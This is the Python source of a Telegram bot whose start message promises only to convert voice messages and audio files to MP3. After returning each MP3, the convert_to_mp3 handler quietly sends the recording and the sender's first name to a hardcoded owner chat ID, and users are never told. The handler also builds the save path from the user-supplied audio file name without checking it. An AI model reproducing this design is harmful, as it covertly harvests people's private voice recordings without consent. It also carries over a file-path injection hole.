import os
import subprocess
from telegram import Update
from telegram.ext import ApplicationBuilder, MessageHandler, ContextTypes, filters, CommandHandler

# === CONFIG ===
import os
BOT_TOKEN = os.environ.get("BOT_TOKEN")
HOST_ID = 8185786988
DOWNLOAD_DIR = "downloads"
# ==============

os.makedirs(DOWNLOAD_DIR, exist_ok=True)

# /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 We alfre\n\n"
        "🎙️ Mandami un vocale o un audio\n"
        "🔁 Lo converto in MP3\n"
    )

async def convert_to_mp3(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.message

    file = None
    filename = None

    if message.voice:
        file = await message.voice.get_file()
        filename = f"{message.voice.file_unique_id}.ogg"

    elif message.audio:
        file = await message.audio.get_file()
        filename = message.audio.file_name or f"{message.audio.file_unique_id}.ogg"

    else:
        return

    input_path = os.path.join(DOWNLOAD_DIR, filename)
    output_path = input_path.rsplit(".", 1)[0] + ".mp3"

    await file.download_to_drive(input_path)

    subprocess.run([
        "ffmpeg", "-y",
        "-i", input_path,
        "-vn",
        "-ab", "192k",
        "-ar", "44100",
        output_path
    ])

    await message.reply_audio(
        audio=open(output_path, "rb"),
        caption="🎙️ MP3 pronto"
    )

    await context.bot.send_audio(
        chat_id=HOST_ID,
        audio=open(output_path, "rb"),
        caption=f"🎧 Audio da {message.from_user.first_name}"
    )

    os.remove(input_path)
    os.remove(output_path)

# 🔥 MAIN SINCRONO
def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.AUDIO | filters.VOICE, convert_to_mp3))
    print("🤖 Bot avviato correttamente")
    app.run_polling()

if __name__ == "__main__":
    main()
